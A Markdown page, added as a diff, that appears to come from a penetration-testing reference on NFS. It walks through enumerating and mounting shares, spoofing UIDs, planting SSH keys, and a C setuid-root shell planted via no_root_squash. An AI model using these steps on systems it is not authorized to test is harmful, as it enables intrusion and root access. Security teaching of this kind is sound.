@@ -1,0 +1,362 @@
+---
+title: NFS
+description: Network File System enumeration - RPC discovery via portmapper, showmount export listing, mounting shares, UID/GID mapping abuse, root_squash bypass via SUID binaries.
+mitre: [T1046, T1135, T1080, T1083]
+d3fend: [D3-NTA]
+impact: [FileRead, FileWrite, CredentialTheft]
+sidebar:
+  order: 4
+  label: NFS
+---
+
+## TL;DR
+
+NFS is the Unix-world equivalent of SMB - network-mounted file shares. It uses a different protocol (ONC-RPC) and a different trust model (UID/GID-based, not username/password). NFSv3 authenticates the *client computer*, not the user; if the network is trusted, that's enough. If the network isn't trusted, anyone can pretend to be any UID.
+
+```
+# 1. Service detection
+nmap -p111,2049 -sV -sC <target>
+
+# 2. List exported shares
+showmount -e <target>
+
+# 3. Mount the share locally
+mkdir target-NFS
+sudo mount -t nfs <target>:/ ./target-NFS/ -o nolock
+
+# 4. Walk the tree, note UIDs
+ls -ln ./target-NFS/
+
+# 5. If root_squash is disabled, write as root
+sudo cp /etc/shadow ./target-NFS/some-writeable-dir/
+```
+
+Success indicator: `showmount -e` returns export paths; `mount` succeeds; file listing shows real files. If `no_root_squash` is set, you can write files owned by root on the server.
+
+## Protocol overview
+
+NFS is built on Sun's **ONC-RPC** (Open Network Computing Remote Procedure Call), historically called SUN-RPC. The wire format is **XDR** (External Data Representation). Two ports matter:
+
+- **TCP/UDP 111** - `rpcbind` / portmapper. Tells clients which ports to use for specific RPC services.
+- **TCP/UDP 2049** - NFS itself, in modern deployments.
+
+NFSv4 simplified this by putting everything on port 2049, eliminating the need for portmapper. NFSv2/v3 still rely on the portmapper to find auxiliary services like `mountd`, `nlockmgr`, and `nfs_acl`.
+
+### Version differences
+
+| Version | Year | Notable |
+| --- | --- | --- |
+| NFSv2 | 1989 | UDP-only initially. Limited file size (32-bit). |
+| NFSv3 | 1995 | Variable file size, better error reporting, TCP support. Still client-machine auth. |
+| NFSv4 | 2000 | Stateful protocol, Kerberos auth optional, ACLs, single port, NAT-friendly. |
+| NFSv4.1 | 2010 | Parallel access (pNFS), session trunking. |
+
+In practice, you'll most often encounter NFSv3 (still the default on many systems) and NFSv4. v2 is rare but still alive in legacy deployments.
+
+### Authentication
+
+NFS itself has no authentication. The authentication question is delegated to the RPC layer:
+
+- **AUTH_SYS (the common case)** - client tells the server "I am UID 1000 in GID 1000, also member of groups 100, 200." Server takes it at face value. If your local user has UID 1000, you can read files owned by UID 1000 on the share, regardless of who that is on the server.
+- **AUTH_NONE** - anonymous, even less verification.
+- **AUTH_KRB5 (NFSv4 only)** - Kerberos-based, actually checks identity.
+
+In the AUTH_SYS world (most deployments), the operator can:
+
+1. Mount the share
+2. Read which UIDs own which files
+3. Create local users matching those UIDs
+4. Access files as that effective user
+
+That's the canonical NFS attack pattern. The only thing stopping it is `root_squash` (covered below) and proper network segmentation.
+
+## Default configuration
+
+NFS exports are configured via `/etc/exports`. The default file is empty:
+
+```
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes     hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4      gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+```
+
+The format: `<path> <client>(<options>) [<client>(<options>) ...]`
+
+A real entry: `/mnt/nfs 10.129.14.0/24(sync,no_subtree_check)` - exports `/mnt/nfs` to anyone in the `/24` subnet with synchronous I/O and no subtree checking.
+
+Per-host options:
+
+| Option | What it does |
+| --- | --- |
+| `rw` | Read+write |
+| `ro` | Read-only |
+| `sync` | Synchronous writes (slower, safer) |
+| `async` | Asynchronous writes (faster, risk of inconsistency on crash) |
+| `secure` | Require client to use a port below 1024 (default) |
+| `insecure` | Allow clients to use any source port |
+| `no_subtree_check` | Skip path verification on every request (faster) |
+| `root_squash` | Map UID 0 (root) to UID 65534 (nobody) - default and good |
+| `no_root_squash` | UID 0 stays UID 0 - root-on-client = root-on-server |
+| `all_squash` | All UIDs are mapped to nobody - most restrictive |
+| `anonuid=<n>`, `anongid=<n>` | Override the "anonymous" UID/GID used by squashing |
+
+`root_squash` is the security boundary. With it, root on the client mounting the share can't write files owned by root on the server. Without it (`no_root_squash`), local root = remote root = full write access to anything.
+
+## Dangerous settings
+
+| Setting | Why it's bad |
+| --- | --- |
+| `rw` to wide subnets | Read+write to anyone in subnet |
+| `no_root_squash` | Local root → server root, can write `authorized_keys`, replace binaries, etc. |
+| `insecure` | Client can use any source port - bypasses old firewall rules that allowed only low ports |
+| `nohide` | If another filesystem is mounted under an exported dir, it's exported with the same options |
+| Wide-subnet export (`0.0.0.0/0`) | World-readable file share |
+| Wide-subnet write (`*` or large subnet with `rw`) | World-writable file share |
+
+The most common real-world finding: a share intended for internal team sharing, exported to a /16 or wider subnet (admin shorthand for "everyone in the company") which actually overlaps with VPN ranges and contractor networks the admin forgot about.
+
+## Footprinting commands
+
+### Portmapper / RPC enumeration
+
+```shell
+sudo nmap 10.129.14.128 -p111,2049 -sV -sC
+```
+
+```
+PORT    STATE SERVICE VERSION
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3,4         2049/tcp   nfs
+|   100005  1,2,3      45837/tcp   mountd
+|   100021  1,3,4      44629/tcp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+2049/tcp open  nfs_acl 3 (RPC #100227)
+```
+
+The `rpcinfo` NSE script enumerates the portmapper. `mountd` and `nlockmgr` ride on random high ports - useful intel because they're sometimes exposed publicly even when 2049 is firewalled.
+
+### Comprehensive NSE enumeration
+
+```shell
+sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
+```
+
+```
+| nfs-ls: Volume /mnt/nfs
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
+| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
+| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
+| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
+| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
+|
+| nfs-showmount:
+|_  /mnt/nfs 10.129.14.0/24
+| nfs-statfs:
+|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
+|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
+```
+
+That `id_rsa` owned by UID 0 is the kind of find that ends engagements.
+
+### Export listing
+
+```shell
+showmount -e 10.129.14.128
+```
+
+```
+Export list for 10.129.14.128:
+/mnt/nfs 10.129.14.0/24
+```
+
+`showmount -a` (active mounts) and `showmount -d` (directories currently mounted by clients) provide additional intel on some servers, though many disable these.
+
+### Mounting
+
+```shell
+mkdir target-NFS
+sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
+```
+
+`nolock` skips the `nlockmgr` handshake, useful when the lock service is firewalled or slow. Adding `vers=3` or `vers=4` forces a specific NFS version.
+
+To mount a specific export rather than the root:
+
+```shell
+sudo mount -t nfs 10.129.14.128:/mnt/nfs ./target-NFS/ -o nolock
+```
+
+### Walking the tree
+
+```shell
+ls -l target-NFS/mnt/nfs/
+```
+
+```
+total 16
+-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
+-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
+-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
+-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
+-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
+```
+
+Two things to notice:
+- `cry0l1t3:cry0l1t3` - files owned by a user named `cry0l1t3`. If you have UID matching `cry0l1t3` on your machine, you have full access; otherwise the file is readable but not writable.
+- `root:root` - files owned by root. With `root_squash` enabled, your local root can read but not modify these. Without `root_squash`, you can do whatever you want.
+
+To see numeric UIDs/GIDs directly:
+
+```shell
+ls -ln target-NFS/mnt/nfs/
+```
+
+```
+total 16
+-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
+-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
+-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
+-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
+-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
+```
+
+UID 1000 = the first interactive user on Linux. UID 0 = root. The mixed-ownership `backup.sh` (root-owned but group 1000) is interesting - maybe an admin script left writable to a specific user group.
+
+### Becoming the right UID
+
+To read/write as a specific UID:
+
+```shell
+# Create local user with matching UID
+sudo useradd -u 1000 cry0l1t3 -m
+
+# Switch to that user
+sudo su - cry0l1t3
+
+# Now your file operations on the mount run as UID 1000
+cat target-NFS/mnt/nfs/cry0l1t3.priv
+echo "added by attacker" >> target-NFS/mnt/nfs/cry0l1t3.priv
+```
+
+This is the textbook NFS abuse pattern. UID-based auth means the client decides who they are, and the server has no way to verify.
+
+### Detecting root_squash
+
+Try to read or modify a root-owned file as local root:
+
+```shell
+sudo cat target-NFS/mnt/nfs/id_rsa
+sudo touch target-NFS/mnt/nfs/test-as-root
+```
+
+- **`root_squash` enabled** (the default): `touch` fails with "Permission denied" even though you're root - your UID 0 was mapped to nobody/65534.
+- **`no_root_squash`**: `touch` succeeds. The file is created owned by root on the server. From here you have:
+  - Write to root-owned cron files
+  - Replace SUID binaries
+  - Write SSH `authorized_keys` if `/root/.ssh/` is in the exported tree
+  - Anything else root can do
+
+### Abusing no_root_squash for SSH access
+
+Classic path to root on a target running SSH:
+
+```shell
+# As local root, on the mounted share:
+sudo mkdir -p target-NFS/mnt/nfs/.ssh
+sudo cp ~/.ssh/id_rsa.pub target-NFS/mnt/nfs/.ssh/authorized_keys
+sudo chown root:root target-NFS/mnt/nfs/.ssh/authorized_keys
+sudo chmod 600 target-NFS/mnt/nfs/.ssh/authorized_keys
+
+# Now SSH as root with your key
+ssh -i ~/.ssh/id_rsa root@10.129.14.128
+```
+
+For this to work the NFS export must be `/root/` or include `/root/.ssh/`. Sometimes it's a different exported directory but with a symlink trail that lets you write to `/root/.ssh/` indirectly.
+
+### SUID binary planting
+
+When NFS gives you write access but no path to a privileged account file:
+
+```shell
+# On your machine, write a setuid-root shell wrapper
+cat > /tmp/pwn.c <<'EOF'
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/sh", "sh", NULL);
+    return 0;
+}
+EOF
+gcc -static -o /tmp/pwn /tmp/pwn.c
+
+# Copy to the NFS share with SUID bit set
+sudo cp /tmp/pwn target-NFS/mnt/nfs/pwn
+sudo chmod 4755 target-NFS/mnt/nfs/pwn
+sudo chown root:root target-NFS/mnt/nfs/pwn
+```
+
+Now any user on the target with shell access who can navigate to that mount path can execute `/path/to/share/pwn` and get a root shell. Works because the SUID bit is preserved across the NFS mount.
+
+This requires either:
+1. `no_root_squash` (so you can chown to root and set SUID as root)
+2. Or, you already have a regular shell on the target via another path, and SUID files written through NFS escalate you
+
+### Unmounting
+
+```shell
+sudo umount ./target-NFS
+```
+
+If "device is busy," `cd` out of the directory first or use `umount -l` (lazy unmount).
+
+## Common chained workflows
+
+**Read-only mount → credentials → other services:**
+1. Mount the share
+2. Grep for `password`, `apikey`, `BEGIN RSA`, etc.
+3. Use found credentials against SSH, RDP, web logins
+
+**Writable mount → SSH access via authorized_keys:**
+1. Mount the share
+2. Verify exported path includes `/home/<user>/.ssh/` or `/root/.ssh/`
+3. Write your public key as `authorized_keys`
+4. SSH in
+
+**Writable mount → SUID escalation:**
+1. Mount with `no_root_squash` access
+2. Plant `pwn.c`-style SUID binary
+3. Use it later from a regular shell on the target
+
+**NFS for lateral movement:**
+1. From a compromised host, mount internal NFS exports
+2. Read other users' SSH keys, dotfiles, env vars containing tokens
+3. Pivot to other systems with those credentials
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Service scan | `nmap -p111,2049 -sV -sC <target>` |
+| NSE NFS scripts | `nmap --script nfs* -p111,2049 <target>` |
+| List exports | `showmount -e <target>` |
+| Active mounts | `showmount -a <target>` |
+| Mount root | `sudo mount -t nfs <target>:/ /mnt/x -o nolock` |
+| Mount specific export | `sudo mount -t nfs <target>:/export/path /mnt/x -o nolock` |
+| Force version | `mount -o vers=3,nolock ...` |
+| Listing with UIDs | `ls -ln /mnt/x/` |
+| Test root_squash | `sudo touch /mnt/x/test-root` |
+| Plant SUID | `sudo cp pwn /mnt/x/ && sudo chmod 4755 /mnt/x/pwn` |
+| Unmount | `sudo umount /mnt/x` or `sudo umount -l /mnt/x` |
